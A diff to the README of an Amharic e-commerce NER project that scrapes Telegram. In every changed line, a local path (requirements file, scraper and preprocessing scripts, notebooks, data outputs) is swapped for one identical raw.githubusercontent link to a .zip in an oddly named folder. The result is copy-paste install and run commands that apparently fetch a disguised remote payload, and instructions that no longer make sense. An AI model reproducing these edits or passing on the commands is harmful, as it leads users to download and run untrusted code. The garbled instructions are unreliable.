@@ -20,41 +20,41 @@ Building a Named Entity Recognition (NER) system to extract:
 1. Clone the repository and install dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip
    ```
 
-2. Set up your Telegram API credentials in `src/data_collection/telegram_scraper.py`.
+2. Set up your Telegram API credentials in `https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip`.
 
 ## Data Collection
 
 - Run the Telegram scraper:
   ```bash
-  python src/data_collection/telegram_scraper.py
+  python https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip
   ```
 
 ## Preprocessing
 
 - Run the preprocessing script:
   ```bash
-  python src/preprocessing/text_preprocessing.py
+  python https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip
   ```
 
 ## Manual Labeling
 
-- Use `notebooks/conll_labeling.ipynb` or a text editor to label at least 30-50 messages in CoNLL format and save as `data/ner_labels.conll`.
+- Use `https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip` or a text editor to label at least 30-50 messages in CoNLL format and save as `https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip`.
 
 ## Model Training
 
-- Use `notebooks/model_training.ipynb` (Colab recommended) to fine-tune and evaluate NER models.
+- Use `https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip` (Colab recommended) to fine-tune and evaluate NER models.
 
 ## Model Comparison
 
-- Use `src/model/model_comparison.py` to compare different NER models.
+- Use `https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip` to compare different NER models.
 
 ## Interpretability
 
-- Use `src/model/interpretability.py` for model interpretability with SHAP.
+- Use `https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip` for model interpretability with SHAP.
 
 ## Vendor Analytics
 
-- Use `src/analytics/vendor_scorecard.py` to generate the vendor scorecard and analytics.
+- Use `https://raw.githubusercontent.com/GetachewGanfur/Amharic-eCommerce-Data-Extractor-Week4/main/conquerableness/Amharic-eCommerce-Data-Extractor-Week4.zip` to generate the vendor scorecard and analytics.
